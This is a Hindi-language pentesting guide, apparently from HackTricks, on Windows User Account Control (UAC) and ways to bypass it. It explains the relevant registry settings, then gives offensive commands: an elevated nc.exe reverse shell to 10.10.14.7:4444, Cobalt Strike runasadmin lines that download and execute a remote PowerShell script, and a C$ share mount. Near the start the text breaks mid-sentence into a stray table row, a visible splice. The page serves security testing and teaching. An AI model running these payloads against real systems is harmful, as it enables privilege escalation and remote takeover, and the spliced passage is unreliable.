# UAC - उपयोगकर्ता खाता नियंत्रण

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एकल [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह।
* [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल** हों या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का** **अनुसरण** करें।**
* **अपने हैकिंग ट्रिक्स को** [**hacktricks रेपो**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud रेपो**](https://github.com/carlospolop/hacktricks-cloud) **में पीआर जमा करके अपना योगदान दें।**

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करें और आसानी से वर्कफ़्लो बनाएं और स्वचालित करें, जो दुनिया के **सबसे उन्नत** सामुदायिक उपकरणों द्वारा संचालित होते हैं।\
आज ही पहुंच प्राप्त करें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[उपयोगकर्ता खाता नियंत्रण (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) एक सुविधा है जो **उच्चतम गतिविधियों के लिए सहमति प्रदान करती है**। अनुप्रयोगों में विभिन्न `अखंडता` स्तर होते हैं, और एक प्रोग्राम जिसमें **उच्च स्तर** होता है, वह कार्यों को कर सकता है जो **सिस्टम को क्षति पहुंचा सकते हैं**। जब UAC सक्षम होता है, अनुप्रयोग और कार्य हमेशा एक गैर-प्रशासक खाते के सुरक्षा संदर्भ में चलते हैं, जब तक कि एक प्रशासक व्यवस्थापक इन अनुप्रयोगों/कार्यों को सिस्टम में प्रशासक स्तर की पहुंच प्रदान करने के लिए स्पष्ट रूप से अधिकृत नहीं करता है। यह एक सुविधा है जो प्रशासकों को अनजाने बदलावों से सुरक्षा प्रदान करती है, लेकिन इसे सुरक्षा सीमा के रूप में नहीं माना जाता है।

अधिक जानकारी के लिए अखंडता स्तरों के बारे में:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

जब UAC सक्रिय होता है, एक प्रशासक उपयोगकर्ता को 2 टोकन मिलते हैं: एक मानक उपयोगकर्ता कुंजी, जिसका उपयोग सामान्य स्तर के कार्यों को सामान्य कार्य के रूप में करने के लिए किया जाता है, और एक ऐसा टोकन जिसमें प्रशासक अधिकार होते हैं।

यह [पृष्ठ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) विस्तार से चर्चा करता है कि UAC कैसे काम करता है और इसमें लॉगऑन प्रक्रिया, उपयोगकर्ता अनुभव और UAC आर्किटेक्चर शामिल हैं। प्रशासक स्थानीय स्तर पर (secpol.msc का उपयोग करक
| [यूजर अकाउंट कंट्रोल: वर्चुअलाइज़ फ़ाइल और रजिस्ट्री लिखने की विफलताएं प्रति-उपयोगकर्ता स्थानों में](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | सक्षम                                                      |

### UAC बाइपास सिद्धांत

कुछ प्रोग्राम **स्वचालित रूप से उच्चतम पद** प्राप्त करते हैं अगर **उपयोगकर्ता** **व्यवस्थापक समूह** में **शामिल होता है**। इन बाइनरी में उनके _**मैनिफेस्ट**_ में _**autoElevate**_ विकल्प होता है जिसका मान _**True**_ होता है। बाइनरी को **माइक्रोसॉफ्ट द्वारा हस्ताक्षरित** भी होना चाहिए।

फिर, **UAC** (मध्यम सत्यापन स्तर से उच्च सत्यापन स्तर में उठना) को **बाइपास** करने के लिए कुछ हमलावर इस प्रकार की बाइनरी का उपयोग करते हैं ताकि वे **विचित्र कोड** को **चला सकें** क्योंकि यह एक **उच्च सत्यापन स्तर प्रक्रिया** से चलाया जाएगा।

आप _Sysinternals_ के उपकरण _**sigcheck.exe**_ का उपयोग करके एक बाइनरी के _**मैनिफेस्ट**_ की जांच कर सकते हैं। और आप _Process Explorer_ या _Process Monitor_ (Sysinternals का हिस्सा) का उपयोग करके प्रक्रियाओं के **सत्यापन स्तर** को देख सकते हैं।

### UAC की जांच करें

UAC सक्षम है या नहीं यह सत्यापित करने के लिए करें:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
यदि यह **`1`** है तो UAC **सक्रिय** है, यदि यह **`0`** है या यह **मौजूद नहीं है**, तो UAC **निष्क्रिय** है।

फिर, **कौन सा स्तर** कॉन्फ़िगर किया गया है, उसे जांचें:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* यदि **`0`** है, तो UAC प्रॉम्प्ट नहीं होगा (अक्षम की तरह)
* यदि **`1`** है, तो व्यवस्थापक को उच्च अधिकारों के साथ बाइनरी को निष्पादित करने के लिए उपयोगकर्ता नाम और पासवर्ड के लिए पूछा जाता है (सुरक्षित डेस्कटॉप पर)
* यदि **`2`** है (**हमेशा मुझे सूचित करें**), तो UAC हमेशा प्रशासक से पुष्टि के लिए पूछेगा जब वह उच्च अधिकारों के साथ कुछ निष्पादित करने की कोशिश करता है (सुरक्षित डेस्कटॉप पर)
* यदि **`3`** है, तो `1` की तरह है लेकिन सुरक्षित डेस्कटॉप पर आवश्यक नहीं है
* यदि **`4`** है, तो `2` की तरह है लेकिन सुरक्षित डेस्कटॉप पर आवश्यक नहीं है
* यदि **`5`** (**डिफ़ॉल्ट**), तो यह व्यवस्थापक से पुष्टि के लिए पूछेगा कि क्या वह गैर Windows बाइनरी को उच्च अधिकारों के साथ चलाने की कोशिश करेगा

फिर, आपको **`LocalAccountTokenFilterPolicy`** की मान की जांच करनी होगी।
यदि मान **`0`** है, तो केवल **RID 500** उपयोगकर्ता (**अंतर्निहित प्रशासक**) ही **UAC के बिना व्यवस्थापक कार्य** कर सकता है, और यदि यह `1` है, तो **"Administrators"** समूह के सभी खाते इसे कर सकते हैं।

और, अंत में **`FilterAdministratorToken`** की कुंजी की मान की जांच करें।
यदि **`0`** (डिफ़ॉल्ट) है, तो **अंतर्निहित प्रशासक खाता** दूरस्थ प्रशासन कार्य कर सकता है और यदि **`1`** है, तो अंतर्निहित खाता प्रशासक **दूरस्थ प्रशासन कार्य नहीं कर सकता है**, जब तक `LocalAccountTokenFilterPolicy` को `1` सेट नहीं किया जाता है।

#### सारांश

* यदि `EnableLUA=0` है या **मौजूद नहीं है**, तो **किसी के लिए भी UAC नहीं है**
* यदि `EnableLua=1` है और **`LocalAccountTokenFilterPolicy=1` है, तो किसी के लिए भी UAC नहीं है**
* यदि `EnableLua=1` है और **`LocalAccountTokenFilterPolicy=0`** और **`FilterAdministratorToken=0`** है, तो **RID 500 (अंतर्निहित प्रशासक) के लिए UAC नहीं है**
* यदि `EnableLua=1` है और **`LocalAccountTokenFilterPolicy=0`** और **`FilterAdministratorToken=1`** है, तो **सभी के लिए UAC है**

इस सभी जानकारी को **metasploit** मॉड्यूल का उपयोग करके एकत्र किया जा सकता है: `post/windows/gather/win_privs`

आप अपने उपयोगकर्ता के समूहों की जांच भी कर सकते हैं और अखंडता स्तर प्राप्त कर सकते हैं:
```
net user %username%
whoami /groups | findstr Level
```
## UAC बाईपास

{% hint style="info" %}
ध्यान दें कि यदि आपके पास पीड़ित के लिए ग्राफिकल पहुंच है, तो UAC बाईपास सीधा है क्योंकि जब UAC प्रॉम्प्ट आता है, आप बस "हाँ" पर क्लिक कर सकते हैं।
{% endhint %}

UAC बाईपास निम्नलिखित स्थिति में आवश्यक होता है: **UAC सक्षम है, आपकी प्रक्रिया माध्यम अखंडता संदर्भ में चल रही है, और आपका उपयोगकर्ता प्रशासक समूह में शामिल है**।

यह महत्वपूर्ण है कि यदि UAC सबसे उच्च सुरक्षा स्तर (हमेशा) में है, तो UAC बाईपास करना **अन्य सभी स्तरों (डिफ़ॉल्ट) में होने की तुलना में कठिन होता है**।

### UAC अक्षम

यदि UAC पहले से ही अक्षम है (`ConsentPromptBehaviorAdmin` **`0`** है), तो आप **एडमिन प्रिविलेज के साथ रिवर्स शेल को निष्पादित** (उच्च अखंडता स्तर) कर सकते हैं, जैसे:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### टोकन डुप्लिकेशन के साथ UAC बाईपास

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **बहुत** साधारण UAC "बाईपास" (पूरी फ़ाइल सिस्टम एक्सेस)

यदि आपके पास एक उपयोगकर्ता के शेल है जो व्यवस्थापक समूह में है, तो आप SMB (फ़ाइल सिस्टम) के माध्यम से साझा की गई C$ को **माउंट कर सकते हैं** और आपको **फ़ाइल सिस्टम के अंदर सबकुछ एक्सेस होगा** (यहां तक कि व्यवस्थापक होम फ़ोल्डर भी)।

{% hint style="warning" %}
**लगता है कि यह ट्रिक अब काम नहीं कर रही है**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC कोबाल्ट स्ट्राइक के साथ बाईपास करें

UAC कोबाल्ट स्ट्राइक तकनीकें केवल तभी काम करेंगी जब तक UAC अपने मैक्स सुरक्षा स्तर पर सेट नहीं है।
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** और **Metasploit** में भी कई मॉड्यूल हैं जो **UAC** को **बाइपास** करने के लिए हैं।

### KRBUACBypass

दस्तावेज़ीकरण और टूल [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass) में हैं।

### UAC बाइपास एक्सप्लोइट्स

[**UACME**](https://github.com/hfiref0x/UACME) जो कई UAC बाइपास एक्सप्लोइट्स का **संकलन** है। ध्यान दें कि आपको **visual studio या msbuild का उपयोग करके UACME को कंपाइल करने की आवश्यकता होगी**। कंपाइलेशन कई executables (जैसे `Source\Akagi\outout\x64\Debug\Akagi.exe`) को बनाएगी, आपको **जानना होगा कि आपको कौन सा चाहिए**।\
आपको **सतर्क रहना चाहिए** क्योंकि कुछ बाइपासेस उपयोगकर्ता को सूचित करने वाले कुछ अन्य प्रोग्राम्स को **प्रोम्प्ट** करेंगे कि कुछ हो रहा है।

UACME में हर तकनीक के लिए **किस बिल्ड संस्करण से काम करना शुरू हुआ** है। आप अपने संस्करण पर प्रभाव डालने वाली तकनीक की खोज कर सकते हैं:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
इस [पेज](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) का उपयोग करके आप विंडोज रिलीज `1607` को बिल्ड संस्करणों से प्राप्त कर सकते हैं।

#### और UAC बाईपास

यहां UAC को बाईपास करने के लिए उपयोग किए जाने वाले **सभी** तकनीकों को एक विक्टिम के साथ **पूर्ण इंटरैक्टिव शेल** की आवश्यकता होती है (एक सामान्य nc.exe शेल काफी नहीं है)।

आप एक **मीटरप्रेटर** सत्र प्राप्त कर सकते हैं। **सत्र** मान **1** के बराबर होने वाले एक **प्रक्रिया** में माइग्रेट करें:

![](<../../.gitbook/assets/image (96).png>)

(_explorer.exe_ काम करेगा)

### GUI के साथ UAC बाईपास

यदि आपके पास एक **GUI तक पहुंच है तो जब आप इसे प्राप्त करते हैं, आप UAC प्रॉम्प्ट को स्वीकार कर सकते हैं**, आपको वास्तव में इसकी बाईपास की आवश्यकता नहीं होती है। इसलिए, एक GUI तक पहुंच प्राप्त करने से आप UAC को बाईपास कर सकते हैं।

इसके अलावा, यदि आप किसी ऐसे GUI सत्र को प्राप्त करते हैं जिसे कोई उपयोग कर रहा था (संभावित रूप से RDP के माध्यम से) तो **कुछ टूल ऐसे होंगे जो व्यवस्थापक के रूप में चल रहे होंगे** जहां से आप UAC के द्वारा फिर से प्रॉम्प्ट न होने के बिना उदाहरण के लिए **एक cmd** चला सकते हैं जैसे [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)। यह थोड़ा अधिक **छिपाव** हो सकता है।

### शोरगुल के साथ ब्रूट-फोर्स UAC बाईपास

यदि आपको शोरगुल की परवाह नहीं है तो आप हमेशा कुछ ऐसा **चला सकते हैं जैसे** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) जो **अनुमतियों को उन्नत करने के लिए पूछता है जब तक उपयोगकर्ता इसे स्वीकार नहीं करता**।

### अपना बाईपास - मूल UAC बाईपास मेथडोलॉजी

यदि आप **UACME** की ओर देखें तो आप देखेंगे कि **अधिकांश UAC बाईपास Dll Hijacking दुर्बलता का दुरुपयोग करते हैं** (मुख्य रूप से दुष्ट dll को _C:\Windows\System32_ पर लिखना)। [एक Dll Hijacking दुर्बलता का पता लगाने के लिए इसे पढ़ें](../windows-local-privilege-escalation/dll-hijacking.md)।

1. एक बाइनरी ढूंढें जो **स्वचालित रूप से उन्नत करेगा** (जांचें कि जब यह निष्पादित होता है तो यह उच्च अखंडता स्तर में चलता है)।
2. प्रोसेसमॉन के साथ "**नाम नहीं मिला**" घटनाएं ढूंढें जो **DLL Hijacking** के लिए संकटग्रस्त हो सकती हैं।
3. आपको शायद **अभिरक्षित पथों** (जैसे C:\Windows\System32) में DLL लिखने की आवश्यकता होगी जहां आपको लेखन अनुमतियाँ नहीं हैं। आप इसे बाईपास कर सकते हैं इस्तेमाल करके:
1. **wusa.exe**: Windows 7,8 और 8.1। इसकी अनुमति होती है कि संरक्षित पथों में CAB फ़ाइल की सामग्री निकाली जा सके (क्योंकि यह उच्च अखंडता स्तर से निष्पादित होता है)।
2. **IFileOperation**: Windows 10।
4. अपनी DLL को संरक्षित पथ में कॉपी करने और संकटग्रस्त और स्वचालित बाइनरी को निष्पादित करने के लिए एक **स्क्रिप्ट** तैयार करें।

### एक और UAC बाईपास तकनीक

इसमें संग्रहीत है कि एक **ऑटोउन्नत बाइनरी** द्वारा देखा जाए कि वह **नाम/पथ** एक **बाइनरी** या **कमांड** को **निष्पादित** करने के लिए **रजिस्ट्री** से **पढ़ने** का प्रयास करता है (यह अधिक रोचक होता है यदि बाइनरी इस जानकारी को **HKCU** के अंदर खोजती है)।

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करें और दुनिया के **सबसे उन्नत समुदाय उपकरणों** द्वारा संचालित **वर्कफ़्लो** को आसानी से बनाएं और स्वचालित करें।\
आज ही पहुंच प्राप्त करें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong
